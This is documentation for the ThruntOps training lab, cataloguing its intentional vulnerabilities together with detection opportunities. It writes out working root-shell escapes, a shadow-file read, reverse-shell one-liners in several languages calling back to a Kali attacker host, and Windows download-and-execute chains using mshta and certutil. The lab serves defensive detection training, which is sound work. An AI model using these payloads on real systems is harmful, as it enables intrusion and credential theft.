---
title: Vulnerabilities
layout: default
nav_order: 6
---

# Vulnerabilities
{: .no_toc }

Attack surface and intentional vulnerability classes present in the ThruntOps lab.
{: .fs-6 .fw-300 }

---

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Active Directory

### Credential Reuse — Domain User to Domain Admin

| Field | Detail |
|---|---|
| **Accounts affected** | `primary_user01` (thruntops.domain), `secondary_user01` (secondary.thruntops.domain) |
| **Condition** | These accounts share the exact password of their respective `domainadmin` |
| **Primitive** | Low-privilege domain user credential → Domain Admin via password reuse |
| **MITRE ATT&CK** | [T1078.002 — Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |
| **Related techniques** | [T1110.001 — Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/), [T1110.004 — Credential Stuffing](https://attack.mitre.org/techniques/T1110/004/) |

**Attack path:**

```
Compromise primary_user01 (low-priv)
  → Recover plaintext / NTLM hash
  → Reuse credential against domainadmin
  → Full domain compromise (T1078.002)
```

**Detection opportunities:**

- Logon event with `domainadmin` originating from a workstation (Event ID 4624, logon type 3/10)
- Same NTLM hash seen across accounts of different privilege levels (requires credential dumping detection — T1003)
- Lateral movement from workstation to DC using admin credentials (Event ID 4769 / Kerberos TGS request for privileged service)

---

### RDP Access to Domain Controllers — Low-Privilege User

| Field | Detail |
|---|---|
| **Accounts affected** | `primary_user02` (thruntops.domain → DC01-2022), `secondary_user02` (secondary.thruntops.domain → DC01-SEC) |
| **Condition** | Low-privilege domain users are members of the `Remote Desktop Users` group on their respective domain controller |
| **Primitive** | Interactive session on a DC as a non-admin — enables local enumeration, memory access attempts, and token abuse |
| **MITRE ATT&CK** | [T1021.001 — Remote Services: Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/) |
| **Related techniques** | [T1078.002 — Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/), [T1003.001 — OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/) |

**Attack path:**

```
Compromise primary_user02 (low-priv)
  → RDP to DC01-2022 (T1021.001)
  → Interactive session on DC — LSASS in scope (T1003.001)
  → Dump credentials / escalate to Domain Admin
```

**Detection opportunities:**

- RDP logon to DC from non-admin account (Event ID 4624, logon type 10, source non-admin)
- Interactive session on DC from workstation IP (Event ID 4778 / 4779 — session connect/disconnect)
- Process creation under non-admin account on DC (Sysmon Event ID 1)

---

### LAPS Password Read — Low-Privilege Domain User

| Field | Detail |
|---|---|
| **Accounts affected** | `primary_user03` (thruntops.domain), `secondary_user03` (secondary.thruntops.domain) |
| **Condition** | `Set-LapsADReadPasswordPermission` granted on the domain root — these users can read `msLAPS-Password` on any workstation in their domain |
| **Primitive** | Low-privilege domain user reads LAPS-managed local admin password → local admin on any workstation |
| **MITRE ATT&CK** | [T1555 — Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/) |
| **Related techniques** | [T1078.002 — Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/), [T1021.001 — Remote Services: RDP](https://attack.mitre.org/techniques/T1021/001/) |

**Attack path:**

```
Compromise primary_user03 (low-priv)
  → Query LAPS: Get-LapsADPassword -Identity WIN11-22H2-1 (T1555)
  → Recover localuser password for target workstation
  → RDP / lateral movement as local admin (T1021.001)
```

**Detection opportunities:**

- Read access to `msLAPS-Password` attribute by non-admin account (AD audit — Event ID 4662, object access on computer object)
- `Get-LapsADPassword` or LDAP query for `msLAPS-Password` from non-privileged context

---

### RDP Access to ADCS — Low-Privilege Domain User

| Field | Detail |
|---|---|
| **Accounts affected** | `primary_user04` (thruntops.domain), `secondary_user04` (secondary.thruntops.domain) |
| **Condition** | Low-privilege domain users from both domains are members of `Remote Desktop Users` on the Certificate Authority (ADCS VM) |
| **Primitive** | Interactive session on the CA — enables certificate template enumeration, ESC abuse, and potential CA private key access |
| **MITRE ATT&CK** | [T1021.001 — Remote Services: Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/) |
| **Related techniques** | [T1649 — Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/), [T1078.002 — Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |

**Attack path:**

```
Compromise primary_user04 (low-priv)
  → RDP to ADCS (T1021.001)
  → Enumerate certificate templates — identify ESC misconfigurations
  → Request malicious certificate (T1649)
  → Authenticate as Domain Admin using certificate
```

**Detection opportunities:**

- RDP logon to ADCS from non-admin account (Event ID 4624, logon type 10)
- Certificate enrollment from unexpected account (Event ID 4886 / 4887 — certificate issued)
- Certify / Certipy tooling signatures in process creation logs (Sysmon Event ID 1)

---

## Linux Privilege Escalation

Entry points: `secondary_user06` → gitlab (10.2.50.15), `primary_user06` → ops (10.2.50.2).

### SUID R — Shell Escape to Root (gitlab)

| Field | Detail |
|---|---|
| **Host** | gitlab (10.2.50.15) |
| **Entry point** | `secondary_user06` (SSH, no sudo) |
| **Condition** | `/usr/bin/R` has SUID root bit set |
| **Primitive** | R spawns a shell inheriting the SUID effective UID → root shell |
| **GTFOBins** | [R — SUID](https://gtfobins.github.io/gtfobins/r/#suid) |
| **MITRE ATT&CK** | [T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) |

**Exploit:**

```bash
R --no-save -e 'system("/bin/sh")'
```

**Attack path:**

```
SSH as secondary_user06 (no sudo)
  → Discover SUID binaries: find / -perm -4000 -type f 2>/dev/null
  → Identify /usr/bin/R with SUID root
  → R --no-save -e 'system("/bin/sh")' → root shell (T1548.001)
```

**Detection opportunities:**

- `R` process spawned by a non-root user with effective UID 0 (Sysmon/auditd — process creation with euid=0)
- `/bin/sh` child of `R` process owned by non-root user
- SUID binary execution outside expected administrative context

---

### SUID apt-get — Shell Escape to Root (gitlab)

| Field | Detail |
|---|---|
| **Host** | gitlab (10.2.50.15) |
| **Entry point** | `secondary_user06` (SSH, no sudo) |
| **Condition** | `/usr/bin/apt-get` has SUID root bit set |
| **Primitive** | apt-get pre-invoke hook executes an arbitrary command as root before the package operation runs |
| **GTFOBins** | [apt-get — SUID](https://gtfobins.github.io/gtfobins/apt-get/#suid) |
| **MITRE ATT&CK** | [T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) |

**Exploit:**

```bash
# Method 1 — Pre-Invoke option (shell exits, then update runs)
apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# Method 2 — Dpkg pre-invoke config (package must not be installed)
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > /tmp/x
apt-get -y install -c /tmp/x sl
```

**Attack path:**

```
SSH as secondary_user06 (no sudo)
  → Discover SUID binaries: find / -perm -4000 -type f 2>/dev/null
  → Identify /usr/bin/apt-get with SUID root
  → apt-get update -o APT::Update::Pre-Invoke::=/bin/sh → root shell (T1548.001)
```

**Detection opportunities:**

- `apt-get` process spawned by non-root user with effective UID 0
- `/bin/sh` child of `apt-get` outside expected maintenance window
- `-o APT::Update::Pre-Invoke` or `Dpkg::Pre-Invoke` in process arguments (Sysmon/auditd)

---

### SUID less — Shell Escape to Root (gitlab)

| Field | Detail |
|---|---|
| **Host** | gitlab (10.2.50.15) |
| **Entry point** | `secondary_user06` (SSH, no sudo) |
| **Condition** | `/usr/bin/less` has SUID root bit set |
| **Primitive** | less shell escape via `!` command executes a shell with the SUID effective UID |
| **GTFOBins** | [less — SUID](https://gtfobins.github.io/gtfobins/less/#suid) |
| **MITRE ATT&CK** | [T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) |

**Exploit:**

```bash
less /etc/hosts
!/bin/sh
```

**Attack path:**

```
SSH as secondary_user06 (no sudo)
  → Discover SUID binaries: find / -perm -4000 -type f 2>/dev/null
  → Identify /usr/bin/less with SUID root
  → less /etc/hosts → !/bin/sh → root shell (T1548.001)
```

**Detection opportunities:**

- `less` spawning `/bin/sh` as child process with euid=0 (Sysmon/auditd)
- Shell process with effective UID 0 parented to a pager binary

---

### SUID rsync — Shell Escape to Root (gitlab)

| Field | Detail |
|---|---|
| **Host** | gitlab (10.2.50.15) |
| **Entry point** | `secondary_user06` (SSH, no sudo) |
| **Condition** | `/usr/bin/rsync` has SUID root bit set |
| **Primitive** | rsync `-e` flag specifies a custom remote shell command — used to spawn a privileged shell via `-p` |
| **GTFOBins** | [rsync — SUID](https://gtfobins.github.io/gtfobins/rsync/#suid) |
| **MITRE ATT&CK** | [T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) |

**Exploit:**

```bash
rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
```

**Attack path:**

```
SSH as secondary_user06 (no sudo)
  → Discover SUID binaries: find / -perm -4000 -type f 2>/dev/null
  → Identify /usr/bin/rsync with SUID root
  → rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x → root shell (T1548.001)
```

**Detection opportunities:**

- `rsync` process with `-e` argument containing `/bin/sh` (Sysmon/auditd process arguments)
- `/bin/sh -p` spawned with euid=0 from rsync parent

---

### sudo ansible-playbook — Shell Escape to Root (ops)

| Field | Detail |
|---|---|
| **Host** | ops (10.2.50.2) |
| **Entry point** | `primary_user06` (SSH, restricted sudo) |
| **Condition** | `primary_user06` can run `/usr/bin/ansible-playbook` with sudo (NOPASSWD) |
| **Primitive** | ansible-playbook executes an arbitrary playbook as root — task with `shell` module spawns a root shell |
| **GTFOBins** | [ansible-playbook — sudo](https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo) |
| **MITRE ATT&CK** | [T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/) |

**Exploit:**

```bash
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > /tmp/x
sudo ansible-playbook /tmp/x
```

**Detection opportunities:**

- `ansible-playbook` executed via sudo by non-admin user (auditd syscall execve, euid=0)
- Playbook path in `/tmp` or user-writable directory

---

### sudo ansible-test — Shell Escape to Root (ops)

| Field | Detail |
|---|---|
| **Host** | ops (10.2.50.2) |
| **Entry point** | `primary_user06` (SSH, restricted sudo) |
| **Condition** | `primary_user06` can run `/usr/bin/ansible-test` with sudo (NOPASSWD) |
| **Primitive** | `ansible-test shell` drops to an interactive shell as root |
| **GTFOBins** | [ansible-test — sudo](https://gtfobins.github.io/gtfobins/ansible-test/#sudo) |
| **MITRE ATT&CK** | [T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/) |

**Exploit:**

```bash
sudo ansible-test shell
```

**Detection opportunities:**

- `ansible-test shell` executed via sudo (auditd)
- Interactive shell spawned from ansible-test with euid=0

---

### sudo certbot — Shell Escape to Root (ops)

| Field | Detail |
|---|---|
| **Host** | ops (10.2.50.2) |
| **Entry point** | `primary_user06` (SSH, restricted sudo) |
| **Condition** | `primary_user06` can run `/usr/bin/certbot` with sudo (NOPASSWD) |
| **Primitive** | certbot `--pre-hook` flag executes an arbitrary command as root before the certificate operation |
| **GTFOBins** | [certbot — sudo](https://gtfobins.github.io/gtfobins/certbot/#sudo) |
| **MITRE ATT&CK** | [T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/) |

**Exploit:**

```bash
sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x \
  --logs-dir /tmp --work-dir /tmp --config-dir /tmp \
  --pre-hook '/bin/sh 1>&0 2>&0'
```

**Detection opportunities:**

- `certbot` executed via sudo with `--pre-hook` argument (auditd process arguments)
- `/bin/sh` child of certbot with euid=0

---

### sudo watch — Shell Escape to Root (ops)

| Field | Detail |
|---|---|
| **Host** | ops (10.2.50.2) |
| **Entry point** | `primary_user06` (SSH, restricted sudo) |
| **Condition** | `primary_user06` can run `/usr/bin/watch` with sudo (NOPASSWD) |
| **Primitive** | watch executes the given command — passing a shell reset sequence drops to a root shell |
| **GTFOBins** | [watch — sudo](https://gtfobins.github.io/gtfobins/watch/#sudo) |
| **MITRE ATT&CK** | [T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/) |

**Exploit:**

```bash
sudo watch 'reset; exec /bin/sh 1>&0 2>&0'
```

**Detection opportunities:**

- `watch` executed via sudo with shell payload in command argument (auditd)
- `/bin/sh` child of watch with euid=0

---

## Reverse Shells

Available on both Linux hosts: **gitlab** (10.2.50.15) and **ops** (10.2.50.2).

**Prerequisites:** Kali must be deployed and reachable at `10.2.50.250`.

```bash
bash scripts/add-kali.sh   # if not already deployed
```

**Shell upgrade** (run after catching any reverse shell):

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

### PHP

```bash
# 1. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 2. Payload — target Linux host
php -r '$s=fsockopen("10.2.50.250",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

### Ruby

```bash
# 1. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 2. Payload — target Linux host
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.2.50.250","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

### Python

```bash
# 1. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 2. Payload — target Linux host
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.2.50.250",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

### Node.js

```bash
# 1. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 2. Payload — target Linux host
node -e 'var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var c=new net.Socket();c.connect(4444,"10.2.50.250",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});'
```

---

### tclsh

```bash
# 1. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 2. Payload — target Linux host
echo 'set s [socket 10.2.50.250 4444];fconfigure $s -translation binary -buffering full;set p [open "|/bin/sh -i" r+];fconfigure $p -translation binary -buffering full;fileevent $s readable "set d [read $s];puts -nonewline $p $d;flush $p";fileevent $p readable "set d [read $p];puts -nonewline $s $d;flush $s";vwait forever' | tclsh
```

---

### Perl

```bash
# 1. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 2. Payload — target Linux host
perl -e 'use Socket;$i="10.2.50.250";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## Windows Reverse Shells

Available on all domain-joined Windows VMs: **DC01-2022** (10.2.50.11), **DC01-SEC** (10.2.50.12), **ADCS** (10.2.50.13), **WEB** (10.2.50.14), **WIN11-22H2-1** (10.2.50.21), **WIN11-22H2-2** (10.2.50.22).

**Prerequisites:** Kali at `10.2.50.250`. For download-based payloads, start an HTTP server on Kali first:

```bash
# Kali — serve files from current working directory
python3 -m http.server 8080
```

---

### PowerShell

```bash
# 1. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 2. Payload — target Windows host (cmd or PS prompt)
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('10.2.50.250',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()"
```

---

### mshta.exe

mshta executes HTML Application (`.hta`) files — VBScript/JScript runs with the full scripting host trust level, bypassing browser security zones.

```bash
# 1. Create shell.hta — Kali
cat > shell.hta << 'EOF'
<html><head><script language="VBScript">
Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('10.2.50.250',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()""", 0, False
self.close
</script></head></html>
EOF

# 2. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 3. HTTP server — Kali (same directory as shell.hta)
python3 -m http.server 8080

# 4. Execute — target Windows host (cmd prompt)
mshta http://10.2.50.250:8080/shell.hta
```

---

### certutil

certutil is a built-in Windows certificate utility — its `-urlcache` flag downloads arbitrary files from HTTP.

```bash
# 1. Create shell.ps1 — Kali
cat > shell.ps1 << 'EOF'
$c=New-Object Net.Sockets.TCPClient('10.2.50.250',4444)
$s=$c.GetStream()
[byte[]]$b=0..65535|%{0}
while(($n=$s.Read($b,0,$b.Length)) -ne 0){
    $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n)
    $r=(iex $d 2>&1|Out-String)
    $rb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ')
    $s.Write($rb,0,$rb.Length);$s.Flush()
}
$c.Close()
EOF

# 2. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 3. HTTP server — Kali (same directory as shell.ps1)
python3 -m http.server 8080

# 4. Download and execute — target Windows host (cmd prompt)
certutil -urlcache -split -f http://10.2.50.250:8080/shell.ps1 C:\Windows\Temp\shell.ps1
powershell -nop -f C:\Windows\Temp\shell.ps1
```

---

### cscript

cscript runs Windows Script Host files in **console mode** — output is written to the calling terminal window.

```bash
# 1. Create shell.js — Kali
cat > shell.js << 'EOF'
var s = new ActiveXObject("WScript.Shell");
s.Run("powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('10.2.50.250',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($n=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$n);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()\"", 0, false);
EOF

# 2. Listener — Kali (10.2.50.250)
nc -lvnp 4444

# 3. HTTP server — Kali (same directory as shell.js)
python3 -m http.server 8080

# 4. Download and execute — target Windows host (cmd prompt)
certutil -urlcache -split -f http://10.2.50.250:8080/shell.js C:\Windows\Temp\shell.js
cscript //nologo C:\Windows\Temp\shell.js
```

---

### wscript

wscript runs the same Windows Script Host files in **GUI (windowless) mode** — no console window appears on the target host.

```bash
# 1–3. Same as cscript — create shell.js on Kali, start listener, start HTTP server

# 4. Download and execute (windowless) — target Windows host (cmd prompt)
certutil -urlcache -split -f http://10.2.50.250:8080/shell.js C:\Windows\Temp\shell.js
wscript //nologo C:\Windows\Temp\shell.js
```

---

## Linux Capabilities

### cap_gdb — CAP_SETUID → Root Shell (ops)

| Field | Detail |
|---|---|
| **Host** | ops (10.2.50.2) |
| **Entry point** | Any user with SSH access (no sudo required) |
| **Condition** | `/usr/bin/gdb` has `cap_setuid+eip` capability set |
| **Primitive** | gdb's Python interpreter calls `os.setuid(0)` — capability allows the setuid syscall without SUID bit — then drops to a root shell |
| **GTFOBins** | [gdb — Capabilities](https://gtfobins.github.io/gtfobins/gdb/#capabilities) |
| **MITRE ATT&CK** | [T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) |

**Exploit:**

```bash
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit /dev/null
```

**Attack path:**

```
SSH as any user (no sudo)
  → Enumerate capabilities: getcap -r / 2>/dev/null
  → Identify /usr/bin/gdb with cap_setuid+eip
  → gdb Python: os.setuid(0) → !sh → root shell (T1548.001)
```

**Detection opportunities:**

- `gdb` process spawning `/bin/sh` with euid=0 from non-root user (auditd execve, euid field)
- `getcap` enumeration on the filesystem (process arguments)
- Python `setuid` syscall from gdb context

---

### cap_gzip — CAP_DAC_OVERRIDE → Arbitrary File Read (gitlab)

| Field | Detail |
|---|---|
| **Host** | gitlab (10.2.50.15) |
| **Entry point** | Any user with SSH access (no sudo required) |
| **Condition** | `/usr/bin/gzip` has `cap_dac_override+eip` capability set |
| **Primitive** | `CAP_DAC_OVERRIDE` bypasses DAC (Discretionary Access Control) read/write checks — gzip can read any file regardless of permissions, leaking content via compression error output |
| **GTFOBins** | [gzip — Capabilities](https://gtfobins.github.io/gtfobins/gzip/#capabilities) |
| **MITRE ATT&CK** | [T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) |

**Exploit:**

```bash
# Read /etc/shadow (or any root-owned file)
LFILE=/etc/shadow
gzip -f "$LFILE" -t
```

**Attack path:**

```
SSH as any user (no sudo)
  → Enumerate capabilities: getcap -r / 2>/dev/null
  → Identify /usr/bin/gzip with cap_dac_override+eip
  → gzip -f /etc/shadow -t → shadow hash contents in error output (T1548.001)
```

**Detection opportunities:**

- `gzip` accessing files owned by root that the calling user cannot normally read (auditd openat syscall with sensitive path)
- `getcap` enumeration (process arguments)
- `gzip` invoked with `-t` flag on `/etc/shadow`, `/etc/passwd`, `/root/` paths

---

## By Technology

| Technology | Vectors |
|---|---|
| Active Directory (dual domain) | Credential reuse, Kerberoasting, AS-REP roasting, ACL abuse, lateral movement, trust abuse |
| ADCS | ESC1–ESC16 certificate template misconfigurations, RDP access to CA |
| IIS + ASP.NET + MSSQL | Web application attacks, SQL injection, authentication bypass |
| GitLab CE | Source code exposure, CI/CD pipeline abuse, secret leakage, SUID privesc |
| Linux — gitlab | SUID binary abuse (R, apt-get, less, rsync), capabilities (gzip/CAP_DAC_OVERRIDE), reverse shells |
| Linux — ops | Restricted sudo escape (ansible-playbook, ansible-test, certbot, watch), capabilities (gdb/CAP_SETUID), reverse shells |
| Windows — all domain VMs | Reverse shells (PowerShell, mshta.exe, certutil, cscript, wscript) |
| Elastic SIEM | Detection engineering, alert tuning, log analysis |

## Notes

- Passwords are randomised but `primary_user01` / `secondary_user01` intentionally share their domain admin password
- No password policy enforced on the domain
- ADCS is configured with intentionally misconfigured templates to enable ESC attack paths
- GitLab CI/CD pipeline deploys directly to IIS on push — pipeline poisoning surface
- Domain trust between `thruntops.domain` and `secondary.thruntops.domain` enables cross-domain lateral movement
- Linux privesc scenarios are only present on profiles that include the relevant VM (gitlab: elastic + splunk; ops: all profiles)
